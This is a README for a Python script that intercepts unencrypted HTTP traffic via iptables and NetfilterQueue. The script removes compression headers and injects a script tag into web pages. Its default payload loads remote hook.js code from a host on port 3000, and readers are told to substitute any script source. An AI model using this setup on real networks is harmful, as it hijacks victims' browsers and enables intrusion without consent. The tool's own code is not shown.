# HTTP Packet Injection Script

This Python script demonstrates HTTP packet injection by modifying HTTP requests and responses. It uses the NetfilterQueue library to intercept packets and Scapy to analyze and modify them. This script is designed for educational purposes, such as understanding network packet manipulation and testing security systems.

## Features
- Intercepts HTTP packets using `netfilterqueue`.
- Strips HTTP request headers like `Accept-Encoding` to disable compression.
- Injects custom JavaScript code into HTTP responses.
- Dynamically updates the `Content-Length` header to reflect the modified payload.

## Requirements
- Python 3
- The following Python libraries:
  - `netfilterqueue` (Install with `pip install netfilterqueue`)
  - `scapy` (Install with `pip install scapy`)
- Linux-based operating system with `iptables` configured.

## How to Use
1. **Set up `iptables` rules:**
   Use the following commands to redirect traffic to the NetfilterQueue:
   ```bash
   sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
   sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
   sudo iptables -I INPUT -j NFQUEUE --queue-num 0
   ```
   Adjust the rules depending on whether you want to process incoming, outgoing, or forwarded traffic.

2. **Run the script as root:**
   ```bash
   sudo python packet_injection.py
   ```

3. **Stop the script and reset `iptables`:**
   After stopping the script, reset the `iptables` rules using:
   ```bash
   sudo iptables --flush
   ```

## Code Overview
1. **Interception:**
   - The script uses `netfilterqueue` to intercept packets.
   - The `process_packet` function processes each packet received from the queue.

2. **Modification:**
   - Requests: Removes the `Accept-Encoding` header to disable compression.
   - Responses: Injects JavaScript code (`<script>` tag) before the `</body>` tag in HTML responses.

3. **Dynamic Updates:**
   - Adjusts the `Content-Length` header to account for the additional payload size.

### Example Injection Code
The default injection code is:
```html
<script src="http://192.168.68.137:3000/hook.js"></script>
```
Replace the URL with your desired script source if needed.

## Example Output
```plaintext
[+] Request
[+] Response
```

## Limitations
- Works only with unencrypted HTTP traffic (not HTTPS).
- Requires root privileges and appropriate `iptables` rules.
- May interfere with other applications relying on the same network traffic.

## Disclaimer
This script is intended for educational and legal purposes only. Unauthorized interception or modification of network traffic is illegal and unethical. Use this tool only in environments where you have explicit permission.

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

